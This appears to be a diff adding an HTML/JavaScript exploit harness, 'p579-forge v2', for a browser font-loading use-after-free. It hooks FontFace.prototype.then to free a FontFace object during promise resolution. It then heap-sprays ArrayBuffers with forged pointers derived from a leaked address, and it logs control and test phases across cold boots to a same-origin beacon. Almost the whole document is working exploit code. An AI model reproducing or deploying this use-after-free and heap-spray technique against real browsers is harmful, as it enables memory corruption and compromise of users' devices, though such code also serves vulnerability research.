@@ -1,0 +1,218 @@
+<!--
+  p579-forge v2: Minimal single-trigger V102 chain consumption test.
+  Reads T from localStorage (set by p579-leak.html or p579 v5 LEAK phase).
+  Each phase (CONTROL, TEST) requires a separate cold boot.
+
+  Open #hardcode to use deterministic T=0x10001cb0d0.
+  Open #reset to clear ALL state.
+  Open #retry to restart from CONTROL.
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p579 forge</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function writeQ(v,o,hi,lo){
+  v[o]=lo&0xFF;v[o+1]=(lo>>>8)&0xFF;v[o+2]=(lo>>>16)&0xFF;v[o+3]=(lo>>>24)&0xFF;
+  v[o+4]=hi&0xFF;v[o+5]=(hi>>>8)&0xFF;v[o+6]=(hi>>>16)&0xFF;v[o+7]=(hi>>>24)&0xFF;
+}
+function writeD(v,o,val){v[o]=val&0xFF;v[o+1]=(val>>>8)&0xFF;v[o+2]=(val>>>16)&0xFF;v[o+3]=(val>>>24)&0xFF;}
+function addQ(hi,lo,d){var nl=lo+d,nh=hi;while(nl<0){nh--;nl+=0x100000000;}while(nl>=0x100000000){nh++;nl-=0x100000000;}return[nh,nl];}
+function hexQ(hi,lo){return('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8);}
+function readQ(v,o){
+  var lo=(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);
+  var hi=(v[o+4]|0)+((v[o+5]|0)<<8)+((v[o+6]|0)<<16)+((v[o+7]|0)*0x1000000);
+  return [hi,lo];
+}
+
+var T_HARD=[0x10,0x01CB0D0];
+var FORGE_80K=32;
+var FORGE_192K=8;
+
+function main(){
+  if(location.hash==='#reset'){
+    try{localStorage.removeItem('p579');}catch(e){}
+    b('P579F-RESET');
+    document.body.innerHTML='<p>Cleared.</p>';
+    return;
+  }
+  if(location.hash==='#hardcode'){
+    var s;try{s=localStorage.getItem('p579');}catch(e){}
+    s=s?JSON.parse(s):{};
+    s.T=T_HARD;s.phase='control';s.ctrl=null;s.test=null;s.run=null;s.boots=s.boots||0;
+    try{localStorage.setItem('p579',JSON.stringify(s));}catch(e){}
+    b('P579F-HARDCODE');
+    document.body.innerHTML='<p>Hardcoded T='+hexQ(T_HARD[0],T_HARD[1])+
+      '. Remove #hardcode and cold boot.</p>';
+    return;
+  }
+  if(location.hash==='#retry'){
+    var r;try{r=localStorage.getItem('p579');}catch(e){}
+    if(r){var s=JSON.parse(r);s.phase='control';s.ctrl=null;s.test=null;s.run=null;
+      try{localStorage.setItem('p579',JSON.stringify(s));}catch(e){}}
+    b('P579F-RETRY');
+    document.body.innerHTML='<p>Retry. Remove #retry and cold boot.</p>';
+    return;
+  }
+
+  var raw;
+  try{raw=localStorage.getItem('p579');}catch(e){}
+  if(!raw){b('P579F-NO-T');document.body.innerHTML='<p>No T. Run p579-leak or open #hardcode.</p>';return;}
+  var state=JSON.parse(raw);
+  if(!state.T){b('P579F-NO-T');document.body.innerHTML='<p>No T. Run p579-leak or open #hardcode.</p>';return;}
+
+  state.boots=(state.boots||0)+1;
+
+  /* Death detection */
+  if(state.run){
+    var dead=state.run;
+    state.run=null;
+    b('P579F-DEATH-'+dead);
+    if(dead==='control'){
+      state.ctrl='died';state.phase='done';
+      try{localStorage.setItem('p579',JSON.stringify(state));}catch(e){}
+      b('P579F-CTRL-DIED');
+      document.body.innerHTML='<p>CONTROL DIED. V102 geometry error or spray missed.<br>'+
+        'T='+hexQ(state.T[0],state.T[1])+'<br>Open #retry to restart.</p>';
+      return;
+    }
+    if(dead==='test'){
+      state.test='died';state.phase='done';
+      try{localStorage.setItem('p579',JSON.stringify(state));}catch(e){}
+      var v=(state.ctrl==='survived')?'CHAIN-CONSUMED':'INCONCLUSIVE';
+      b('P579F-'+v);
+      document.body.innerHTML='<p><b>'+v+'</b><br>CTRL='+state.ctrl+' TEST=died<br>'+
+        'T='+hexQ(state.T[0],state.T[1])+'</p>';
+      return;
+    }
+  }
+
+  var T=state.T;
+  if(state.phase==='done'){
+    var msg='DONE CTRL='+state.ctrl+' TEST='+state.test;
+    b('P579F-'+msg);
+    document.body.innerHTML='<p>'+msg+'<br>#reset or #retry</p>';
+    return;
+  }
+
+  var mode=state.phase||'control';
+  if(mode!=='control'&&mode!=='test'){mode='control';}
+  b('P579F-'+mode+'-T='+hexQ(T[0],T[1]));
+
+  /* Pre-churn */
+  var pcName='pc'+Math.random().toString(36).slice(2,8);
+  var dummy;
+  try{dummy=new FontFace(pcName,'local(Arial)',{unicodeRange:'U+0043'});}catch(e){}
+  if(dummy){
+    document.fonts.add(dummy);
+    dummy.load();
+    dummy.loaded.then(function(){
+      try{document.fonts.delete(dummy);}catch(e){}
+      document.body.offsetHeight;
+      b('P579F-PC-OK');
+      runForge(state,T,mode);
+    },function(){b('P579F-PC-FAIL');runForge(state,T,mode);});
+  }else{
+    runForge(state,T,mode);
+  }
+}
+
+function runForge(state,T,mode){
+  state.run=mode;
+  try{localStorage.setItem('p579',JSON.stringify(state));}catch(e){}
+
+  var Tp30=addQ(T[0],T[1],0x30);
+  var Tm10=addQ(T[0],T[1],-0x10);
+  var Tp20=addQ(T[0],T[1],0x20);
+  var fname='ff'+state.boots;
+  var sname='sf'+state.boots;
+
+  var victim=new FontFace(fname,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(victim);
+  void victim.loaded;
+  window.__r=[victim];
+
+  var se=document.createElement('style');
+  se.textContent="@font-face{font-family:"+sname+";src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(se);
+
+  var fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(fired)return undefined;
+      fired=true;
+      if(se)se.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      b('P579F-FREE');
+
+      /* 80B V102 spray */
+      for(var k=0;k<FORGE_80K;k++){
+        var v=new Uint8Array(new ArrayBuffer(80));
+        writeD(v,0x00,0);writeD(v,0x04,1);writeD(v,0x08,0);writeD(v,0x0C,1);
+        writeQ(v,0x10,Tp30[0],Tp30[1]);
+        writeD(v,0x28,0x42424242);
+        writeQ(v,0x30,Tm10[0],Tm10[1]);
+        writeD(v,0x40,0x41414141);
+        if(mode==='control'){writeQ(v,0x48,0,0);}
+        else{writeQ(v,0x48,Tp20[0],Tp20[1]);}
+        window.__r.push(v);
+      }
+      /* 192B anchor */
+      for(var k=0;k<FORGE_192K;k++){
+        var v2=new Uint8Array(new ArrayBuffer(192));
+        writeD(v2,0x00,2);
+        writeQ(v2,0x58,T[0],T[1]);
+        window.__r.push(v2);
+      }
+      b('P579F-SPRAY-80='+FORGE_80K+'-192='+FORGE_192K);
+      try{document.fonts.check('1em '+sname);}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  b('P579F-GO');
+  document.fonts.load('1em '+fname+', '+sname,'AB').then(function(){},function(){});
+
+  /* Readback */
+  setTimeout(function(){
+    var fg=window.__r;
+    if(!fg)return;
+    var w80='none';
+    for(var i=1;i<fg.length;i++){
+      if(fg[i].length===80){
+        var r=readQ(fg[i],0x10);
+        var ex=addQ(T[0],T[1],0x30);
+        w80=(r[0]===ex[0]&&r[1]===ex[1])?'OURS':'OTHER-'+hexQ(r[0],r[1]);
+        break;
+      }
+    }
+    b('P579F-RB-'+mode+'-80='+w80);
+  },200);
+
+  /* Survival */
+  setTimeout(function(){
+    b('P579F-SURVIVED-'+mode);
+    state.run=null;
+    if(mode==='control'){
+      state.ctrl='survived';state.phase='test';
+      try{localStorage.setItem('p579',JSON.stringify(state));}catch(e){}
+      b('P579F-CTRL-OK');
+      document.body.innerHTML='<p>CONTROL SURVIVED<br>'+
+        'T='+hexQ(T[0],T[1])+
+        '<br>COLD BOOT REQUIRED. Load this page after power off/on for TEST.</p>';
+    }else{
+      state.test='survived';state.phase='done';
+      try{localStorage.setItem('p579',JSON.stringify(state));}catch(e){}
+      b('P579F-RESULT-CTRL='+state.ctrl+'-TEST=survived');
+      document.body.innerHTML='<p>CTRL='+state.ctrl+' TEST=survived<br>'+
+        'Spray missed. T='+hexQ(T[0],T[1])+'<br>Open #retry to restart.</p>';
+    }
+  },1500);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(main,0);
+else document.addEventListener('DOMContentLoaded',main);
+</script></head><body><p>p579-forge v2</p></body></html>
